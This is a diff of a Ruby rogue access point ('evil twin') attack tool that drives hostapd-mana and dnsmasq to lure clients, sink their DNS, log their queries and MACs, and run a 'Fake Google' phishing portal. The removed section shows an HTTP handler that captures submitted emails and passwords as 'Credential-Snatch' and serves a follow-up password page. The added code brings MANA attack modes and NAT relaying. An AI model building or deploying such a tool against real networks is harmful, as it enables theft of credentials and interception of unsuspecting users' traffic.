@@ -1,143 +1,314 @@
-# frozen_string_literal: true
-
 require_relative("libs/decoder")
+require_relative("libs/net-utils")
 require("socket")
 require("json")
-# require("packetfu")
 
-Log = Log4Bot.new("%H:%M:%S")
-Codec = Decoder.new
-# Sniff = PacketFu::Capture.new(:iface => iface, :start => true)
+logs = Log4Bot.new("%H:%M:%S")
+netutils = NetUtils.new()
 
-Log.Logo
-puts ARGV.inspect
-# If Argv[0] is nil, then return an error
-if ARGV[0].nil?
-  puts("The wireless rouge attack platform")
-  puts("Usage: ruby #{__FILE__} <interface> <essid> <channel> <password (optional)>")
+# logs.showlogo
+# Basic Arguments
+arguments = {
+  "interface" => nil,
+  "essid" => nil,
+  "channel" => nil,
+  "password" => nil,
+  "mode" => 0,
+  "internet" => nil,
+  "tap" => false,
+  "mana" => false,
+  "mana-full" => false
+}
+ARGV.each do |arg|
+  if arg.start_with?("--")
+    arg = arg.split("=")
+    if arg[1] == "true"
+      arg[1] = true
+    elsif arg[1] == "false"
+      arg[1] = false
+    end
+    arguments[arg[0].gsub("--", "")] = arg[1]
+  end
+end
+if arguments["mode"].to_s =~ /^\d+$/
+  arguments["mode"] = arguments["mode"].to_i
+elsif arguments["channel"].to_s =~ /^\d+$/
+  arguments["channel"] = arguments["channel"].to_i
+else
+  logs.error("Channel / Mode must be an integer")
   exit 1
 end
 
-# Minimum of 3 args
-if ARGV.length < 3
-  Log.error("Usage: ruby main.rb <interface> <essid> <channel> <password (optional)>")
+
+ARGV.clear # Clear the arguments so we don't get any errors.
+puts arguments
+
+if arguments["interface"].nil? || arguments["essid"].nil? || arguments["channel"].nil? || arguments["mode"] > 2
+  logs.error("#{COLORA[:bold]}Invalid arguments.#{COLORA[:reset]}")
+  logs.info("#{COLORA[:underline]}Required Arguments#{COLORA[:reset]}: --interface, --essid, --channel, --mode")
+  logs.info("Example: #{COLORA[:italic]}--interface=wlan0 --essid=\"Free WiFi\" --channel=11 --mode=0#{COLORA[:reset]}")
+  logs.info("|#{' ' * 29}#{COLORA[:bold]}HELP#{COLORA[:reset]}#{' ' * 29}|")
+  logs.info("#{'-' * 64}")
+
+  logs.info("#{COLORA[:bold]}Basic Required Arguments#{COLORA[:reset]}")
+  logs.info("  #{COLORA[:bold]}interface#{COLORA[:reset]} : The wireless interface to use.")
+  logs.info("  #{COLORA[:bold]}essid#{COLORA[:reset]}     : The #{COLORA[:italic]}name#{COLORA[:reset]} of the fake wireless network.")
+  logs.info("  #{COLORA[:bold]}channel#{COLORA[:reset]}   : The WiFi channel (must be supported by your adapter).")
+  logs.info("  #{COLORA[:bold]}mode#{COLORA[:reset]}      : Operating mode (see below).")
+
+  logs.info("#{COLORA[:bold]}Optional Arguments#{COLORA[:reset]}")
+  logs.info("  #{COLORA[:bold]}internet#{COLORA[:reset]}  : Outbound interface for relaying internet (optional).")
+  # logs.info("  #{COLORA[:bold]}tap#{COLORA[:reset]}       : Create a TAP interface (requires 'internet').")
+  logs.info("  #{COLORA[:bold]}mana#{COLORA[:reset]}      : Enable HostAPd-mana's attack features.")
+  logs.info("  #{COLORA[:bold]}mana-full#{COLORA[:reset]} : Use aggressive MANA mode.")
+  logs.info("  #{COLORA[:bold]}dns-hosts#{COLORA[:reset]} : DNS sinkhole hosts file for mode 3 (sink all if omitted).")
+
+  logs.info("#{COLORA[:bold]}Interaction Modes#{COLORA[:reset]}")
+  logs.info("  #{COLORA[:bold]}0#{COLORA[:reset]} : Open Access Point — clients can connect, get IP, optional internet.")
+  logs.info("  #{COLORA[:bold]}1#{COLORA[:reset]} : Fake Google — captive portal phishing via DNS sinkhole (no internet).")
+  logs.info("  #{COLORA[:bold]}2#{COLORA[:reset]} : DNS Sinkhole — acts as AP with DNS trap (sinks all if no host file).")
+end
+
+hostapdConfig = []
+dnsmasqConfig = []
+# 
+dnsLog = "/tmp/#{Random.rand(1000..9999)}.log"
+hostLog = "/tmp/#{Random.rand(1000..9999)}.log"
+# 
+dhcpConf = "/tmp/#{Random.rand(1000..9999)}.conf"
+hostConf = "/tmp/#{Random.rand(1000..9999)}.conf"
+
+hostThreads = nil
+dhcpThreads = nil
+dhcpHandler = nil
+hostHandler = nil
+
+trap("INT") do
+  logs.warn("Caught SIGINT, stopping...")
+
+  system("killall hostapd dnsmasq hostapd-mana")
+  # Delete the files
+  # system("rm #{hostLog} #{dnsLog} #{hostConf} #{dhcpConf}")
+  [hostLog, dnsLog, hostConf, dhcpConf].each do |f|
+    File.delete(f) if File.exist?(f)
+  end
+
+  system("iwconfig #{arguments["interface"]} mode managed")
+
+  hostThreads.kill
+  dhcpThreads.kill
+  Process.kill("SIGKILL", Process.pid)
   exit
 end
 
-Interface = ARGV[0]
-Essid = ARGV[1]
-Channel = ARGV[2]
-Password = ARGV[3]
-DnsConf = "/tmp/#{Random.rand(1000..9999)}_dns.conf"
-HostapdConf = "/tmp/#{Random.rand(1000..9999)}_hostapd.conf"
-DhcpLog = "/tmp/#{Random.rand(1000..9999)}_dhcp.log"
-HostapdLog = "/tmp/#{Random.rand(1000..9999)}_hostapd.log"
 
-hostLog = nil
-dhcpLog = nil
-hostThread = nil
-dhcpThread = nil
-lastestDns = ""
-lastestHost = ""
+# trap("EXIT") do
+#   logs.warn("Caught SIGEXIT, stopping...")
+#   system("killall hostapd dnsmasq hostapd-mana")
+#   # Delete the files
+#   [hostLog, dnsLog, hostConf, dhcpConf].each do |f|
+#     File.delete(f) if File.exist?(f)
+#   end
 
-# Well check if the interface exist's.
-if File.exist?("/sys/class/net/#{Interface}")
-  Log.info("Found #{Interface}")
-else
-  Log.error("Interface \e[1m#{Interface}\e[0m does not exist")
-  exit
-end
+#   system("iwconfig #{arguments["interface"]} mode managed")
 
-if Password.nil?
-  File.open(HostapdConf, "w") do |f|
-    f.puts("interface=#{Interface}")
-    f.puts("driver=nl80211")
-    f.puts("ssid=#{Essid}")
-    f.puts("channel=#{Channel}")
-    f.puts("hw_mode=g")
-  end
-else
-  Log.warn("Network(\e[1m#{Essid}\e[0m) -> Password(\e[1m#{Password}\e[0m)")
-  File.open(HostapdConf, "w") do |f|
-    f.puts("interface=#{Interface}")
-    f.puts("driver=nl80211")
-    f.puts("ssid=#{Essid}")
-    f.puts("channel=#{Channel}")
-    f.puts("hw_mode=g")
-    f.puts("macaddr_acl=0")
-    f.puts("ignore_broadcast_ssid=0")
-    f.puts("auth_algs=1")
-    f.puts("wpa=2")
-    f.puts("wpa_passphrase=#{Password}")
-    f.puts("wpa_key_mgmt=WPA-PSK")
-    f.puts("wpa_pairwise=TKIP")
-    f.puts("rsn_pairwise=CCMP")
-  end
-end
-File.open(DnsConf, "w") do |f|
-  f.puts("interface=#{Interface}")
-  f.puts("dhcp-authoritative")
-  f.puts("log-dhcp")
-  f.puts("log-queries")
-  f.puts("log-facility=#{DhcpLog}")
-  f.puts("bind-interfaces")
-  f.puts("bogus-priv")
-  f.puts("dhcp-range=10.0.1.2,10.0.1.16,1h")
-  f.puts("address=/#/10.0.1.1")
-end
+#   hostThreads.kill
+#   dhcpThreads.kill
+#   Process.kill("SIGKILL", Process.pid)
+#   exit
+# end
 
-if system("ifconfig #{Interface} 10.0.1.1 netmask 255.255.255.0 2> /dev/null")
-  Log.info("Set IP address on \e[1m#{Interface}\e[0m -> \e[1m10.0.1.1\e[0m")
-else
-  Log.error("Failed to set IP address on #{Interface}")
+
+
+# Check user's paramns aren't bogus.
+if !netutils.interfaceExist?(arguments["interface"])
+  logs.error("Invalid interface given #{arguments["internet"]}... (not found)")
   exit 1
-end
-if system("iwconfig #{Interface} mode managed 2> /dev/null")
-  Log.info("Set \e[1m#{Interface}\e[0m to managed mode")
-else
-  Log.error("Failed to set \e[1m#{Interface}\e[0m to managed mode")
+elsif !arguments["internet"].nil? && (!netutils.interfaceExist?(arguments["internet"]))
+  logs.error("Invalid Internet interface given #{arguments["internet"]}... (not found)")
   exit 1
 end
 
-hostThread = Thread.new do
-  File.new(HostapdLog, "w", 0o644)
-  if system("hostapd #{HostapdConf} > #{HostapdLog} 2>&1")
-    Log.info("Started hostapd on \e[1m#{Interface}\e[0m")
+
+hostapdConfig.push("interface=#{arguments["interface"]}")
+hostapdConfig.push("driver=nl80211")
+hostapdConfig.push("ssid=#{arguments["essid"]}")
+hostapdConfig.push("channel=#{arguments["channel"]}")
+
+# Generate the configs
+if netutils.is5ghz?(arguments["channel"]).nil?
+  logs.error("Invalid Channel; 1 -> 14 2.4GHz to 36 -> 165 5Ghz")
+  exit 1
+end
+
+if netutils.is5ghz?(arguments["channel"])
+  logs.warn("Be sure that your WiFi card can support 5ghz!!")
+  hostapdConfig.push("hw_mode=a")
+else
+  hostapdConfig.push("hw_mode=g")
+end
+
+# Check for MANA stuff
+if arguments["mana"]
+  hostapdConfig.push("enable_mana=1")
+
+end
+if arguments["mana-full"]
+  hostapdConfig.push("mana_loud=1")
+end
+
+
+
+# Other stuff here lol
+hostapdConfig.push("country_code=US")
+hostapdConfig.push("macaddr_acl=0")
+hostapdConfig.push("ignore_broadcast_ssid=0")
+hostapdConfig.push("ieee80211d=1")
+hostapdConfig.push("ieee80211n=1")
+hostapdConfig.push("ieee80211ac=1")
+
+# For WPA 2 (not in use lol) #
+# f.puts("auth_algs=1")
+# f.puts("wpa=2")
+# f.puts("wpa_passphrase=#{Password}")
+# f.puts("wpa_key_mgmt=WPA-PSK")
+# f.puts("wpa_pairwise=TKIP")
+# f.puts("rsn_pairwise=CCMP")
+
+
+# #DEBUG
+# puts("Hostapd config")
+# puts hostapdConfig.join("\n")
+# #DEBUG
+
+
+
+
+
+# Configure interface(s)
+if system("iwconfig #{arguments["interface"]} mode managed 2> /dev/null")
+  logs.info("Configured #{arguments["interface"]} to #{COLORA[:bold]}managed#{COLORA[:end]} mode")
+else
+  logs.error("Failed to set #{arguments["interface"]} to managed mode.")
+  exit 1
+end
+
+# Set the interface's IP n stuff
+if system("ifconfig #{arguments["interface"]} 10.0.1.1 netmask 255.255.255.0 2> /dev/null")
+  logs.info("Set #{arguments["interface"]} to #{COLORA[:bold]}10.0.1.1#{COLORA[:end]}")
+else
+  logs.error("Failed to set #{arguments["interface"]}'s IP address")
+  exit 1
+end
+
+
+dnsmasqConfig.push("interface=#{arguments["interface"]}")
+dnsmasqConfig.push("dhcp-authoritative")
+dnsmasqConfig.push("log-dhcp")
+dnsmasqConfig.push("log-queries")
+dnsmasqConfig.push("log-facility=#{dnsLog}")
+dnsmasqConfig.push("bind-interfaces")
+dnsmasqConfig.push("bogus-priv")
+dnsmasqConfig.push("dhcp-range=10.0.1.2,10.0.1.100,12h")
+dnsmasqConfig.push("server=1.1.1.1")
+
+
+
+case arguments["mode"]
+when 0
+  logs.info("Mode 0 selected: Open Access Point")
+  
+  dnsmasqConfig.push("dhcp-option=3,10.0.1.1")
+  dnsmasqConfig.push("dhcp-option=6,1.1.1.1") # DNS server
+
+  if arguments["internet"]
+    logs.info("Enabling IP forwarding and NAT via #{arguments["internet"]}")
+    begin
+      system("sysctl -w net.ipv4.ip_forward=1")
+      system("iptables --flush")
+      system("iptables --table nat --flush")
+      system("iptables --delete-chain")
+      system("iptables --table nat --delete-chain")
+      system("iptables -t nat -A POSTROUTING -o #{arguments["internet"]} -j MASQUERADE")
+      system("iptables -A FORWARD -i #{arguments["internet"]} -o #{arguments["interface"]} -m state --state RELATED,ESTABLISHED -j ACCEPT")
+      system("iptables -A FORWARD -i #{arguments["interface"]} -o #{arguments["internet"]} -j ACCEPT")
+    rescue => e
+      logs.error("Failed to configure NAT:\n#{e}\n#{e.backtrace.join("\n")}")
+    end
+  end
+when 1
+  logs.info("Mode 1 selected: Captive Portal / Fake Google")
+when 2
+  logs.info("Mode 2 selected: DNS Sinkhole")
+end
+
+logs.info("DCHP/HOSTAPD to #{dhcpConf} : #{hostConf}")
+File.write(dhcpConf, dnsmasqConfig.join("\n"))
+File.write(hostConf, hostapdConfig.join("\n"))
+
+hostThreads = Thread.new do 
+  File.new(hostLog, "w", 0o644)
+  cmd = ""
+  if arguments["mana"]
+    cmd = "hostapd-mana"
   else
-    Log.error("Failed to start hostapd on \e[1m#{Interface}\e[0m")
+    cmd = "hostapd"
+  end
+
+  if system("#{cmd} #{hostConf} > #{hostLog} 2>&1")
+    logs.info("Started hostapd on \e[1m#{arguments["interface"]}\e[0m")
+  else
+    logs.error("Failed to start hostapd on \e[1m#{arguments["interface"]}\e[0m")
     exit 1
   end
 end
-dhcpThread = Thread.new do
-  File.new(DhcpLog, "w", 0o644)
-  if system("dnsmasq -C #{DnsConf} -k")
-    Log.info("Started dnsmasq on \e[1m#{Interface}\e[0m")
+
+dhcpThreads = Thread.new do
+  File.new(dnsLog, "w", 0o644)
+  if system("dnsmasq -C #{dhcpConf} -k")
+    logs.info("Started dnsmasq on \e[1m#{arguments["interface"]}\e[0m")
   else
-    Log.error("Failed to start dnsmasq on \e[1m#{Interface}\e[0m")
+    logs.error("Failed to start dnsmasq on \e[1m#{arguments["interface"]}\e[0m")
     exit 1
   end
 end
+
+
+
+
+# hostapdConfig = []
+# dnsmasqConfig = []
+# # 
+# dnsLog = "/tmp/#{Random.rand(1000..9999)}.log"
+# hostLog = "/tmp/#{Random.rand(1000..9999)}.log"
+# # 
+# dhcpConf = "/tmp/#{Random.rand(1000..9999)}.conf"
+# hostConf = "/tmp/#{Random.rand(1000..9999)}.conf"
+
 
 fails = 0
+
+hostLogFile = nil
+dnsLogFile = nil
 LogThread = Thread.start do
   loop do
-    if hostLog.nil? || dhcpLog.nil?
+    if hostLogFile.nil? || dnsLogFile.nil?
       begin
-        hostLog = File.open(HostapdLog, "r")
-        dhcpLog = File.open(DhcpLog, "r")
-        Log.info("Hooked into \e[1m#{HostapdLog}\e[0m and \e[1m#{DhcpLog}\e[0m")
+        hostLogFile = File.open(hostLog, "r")
+        dnsLogFile = File.open(dnsLog, "r")
+        logs.info("Hooked into \e[1m#{hostLog}\e[0m and \e[1m#{dnsLog}\e[0m")
       rescue Exception => e
         fails += 1
         sleep 0.5
         if fails > 5
-          Log.error("Failed to open log files: #{e}")
+          logs.error("Failed to open log files: #{e}")
           exit 1
         end
         retry
       end
     end
-    lastestDns = dhcpLog.read
-    lastestHost = hostLog.read
+    lastestDns = dnsLogFile.read
+    lastestHost = hostLogFile.read
     unless lastestDns.nil?
       lastestDns.chomp!
       # Log.debug("DNS: #{lastestDns}") unless lastestDns.empty?
@@ -152,17 +323,17 @@ LogThread = Thread.start do
           else
             data[8]
           end
-        Log.dhcp("IP:\e[1m#{ip}\e[0m -> \e[1m#{mac}\e[0m (#{hostname})")
+        logs.dhcp("IP:\e[1m#{ip}\e[0m -> \e[1m#{mac}\e[0m (#{hostname})")
       elsif lastestDns.include?("query[")
         data = lastestDns.split(" ")
         hostname = data[5]
         from = data[7]
-        Log.dns("\e[1m#{from}\e[0m ---> \e[1m#{hostname}\e[0m \e[38;2;211;211;0m(Query)\e[0m")
+        logs.dns("\e[1m#{from}\e[0m ---> \e[1m#{hostname}\e[0m \e[38;2;211;211;0m(Query)\e[0m")
       elsif lastestDns.include?("config")
         data = lastestDns.split(" ")
         hostname = data[5]
         from = data[7]
-        Log.dns("\e[1m#{from}\e[0m <--- \e[1m#{hostname}\e[0m \e[38;2;100;0;211m(Reply)\e[0m")
+        logs.dns("\e[1m#{from}\e[0m <--- \e[1m#{hostname}\e[0m \e[38;2;100;0;211m(Reply)\e[0m")
       end
     end
     next if lastestHost.nil?
@@ -172,98 +343,13 @@ LogThread = Thread.start do
     if lastestHost.include?("AP-STA-CONNECTED")
       data = lastestHost.split(" ")
       mac = data[2]
-      Log.hostapd("Client \e[1m#{mac}\e[0m connected")
+      logs.hostapd("Client \e[1m#{mac}\e[0m connected")
     elsif lastestHost.include?("AP-STA-DISCONNECTED")
       data = lastestHost.split(" ")
       mac = data[2]
-      Log.hostapd("Client \e[1m#{mac}\e[0m disconnected")
+      logs.hostapd("Client \e[1m#{mac}\e[0m disconnected")
     end
   end
 end
 
-Thread.start do
-  handler = TCPServer.new(80)
-  lastemail = ""
-  loop do
-    Thread.start(handler.accept) do |client|
-      read = client.readpartial(2048)
-      # puts read
-      request = Codec.decode(read, client.peeraddr[3])
-      # Log.http("#{client.peeraddr[3]}: #{request['Method']} #{request['Path']} #{request['User-Agent']}")
-      if File.exist?("src#{request["Path"]}")
-        Log.http("#{client.peeraddr[3]}: #{request["Method"]} #{request["Path"]} (#{request["User-Agent"]})")
-        client.write(
-          Codec.genResponse(
-            "200 OK",
-            "text/#{request["Ext"]}",
-            File.read("src#{request["Path"]}")
-          )
-        )
-      elsif request["Path"] == "/auth" && request["Method"] == "POST"
-        Log.http("#{client.peeraddr[3]}-Credential-Snatch: #{request["Data"]}") unless request["Data"].nil?
-        lastemail = request["Data"]["email"].gsub("%40", "@") unless request["Data"]["email"].nil?
-
-        puts request["Data"]
-        client.write(
-          Codec.genRedir(
-            "/login.html"
-          )
-        )
-      elsif request["Path"].include?("login")
-        Log.http("#{client.peeraddr[3]}: #{request["Method"]} #{request["Path"]} (#{request["User-Agent"]}) : Stage-2")
-        file = File.read("src/pwd.html")
-        client.write(
-          Codec.genResponse(
-            "200 OK",
-            "text/#{request["Ext"]}",
-            file.gsub!("[email]", lastemail)
-          )
-        )
-      else
-        Log.http("#{client.peeraddr[3]}: #{request["Method"]} #{request["Path"]} (#{request["User-Agent"]}) 404")
-        client.write(
-          Codec.genRedir(
-            "/"
-          )
-        )
-      end
-      client.close
-      next
-    end
-  end
-rescue Exception => e
-  # If error is becuase port is in use, then exit
-  if e.message.include?("in use")
-    Log.error("Failed to start HTTP server: #{e}")
-    exit 1
-  end
-  Log.error("HTTP server error: #{e}")
-  retry
-end
-
-trap("INT") do
-  Log.warn("Caught SIGINT, stopping...")
-  system("killall hostapd dnsmasq")
-  # Delete the files
-  system("rm #{HostapdLog} #{DhcpLog} #{HostapdConf} #{DnsConf}")
-  hostThread.kill
-  dhcpThread.kill
-  Process.kill("SIGKILL", Process.pid)
-  exit
-end
-trap("EXIT") do
-  Log.warn("Caught SIGEXIT, stopping...")
-  system("killall hostapd dnsmasq")
-  # Delete the files
-  system("rm #{HostapdLog} #{DhcpLog} #{HostapdConf} #{DnsConf}")
-  hostThread.kill
-  dhcpThread.kill
-  Process.kill("SIGKILL", Process.pid)
-  exit
-end
-
-Log.info("Starting hostapd on \e[1m#{Interface}\e[0m")
-Log.info("Starting dnsmasq on \e[1m#{Interface}\e[0m")
-Log.info("Press Ctrl+C to stop")
-# start the logger thread
 LogThread.join
